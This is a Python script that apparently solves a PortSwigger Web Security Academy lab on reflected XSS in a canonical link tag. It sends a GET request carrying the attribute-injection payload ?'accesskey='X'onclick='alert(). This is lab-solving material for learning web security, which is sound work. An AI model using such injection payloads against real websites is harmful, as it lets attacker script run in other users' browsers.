##############################################################
#
# Lab: Reflected XSS in canonical link tag
#
# Hack Steps: 
#      1. Inject payload as a query string of the URL
#      2. The alert function will be called after pressing 
#         the correct key combinations
#
##############################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a0e00230485721280a308c800470077.web-security-academy.net"

def main():
    payload = "?'accesskey='X'onclick='alert()"
    
    print("❯❯ Injecting payload as a query string of the URL.. ", end="", flush=True)

    try:
        requests.get(f"{LAB_URL}{payload}")

    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()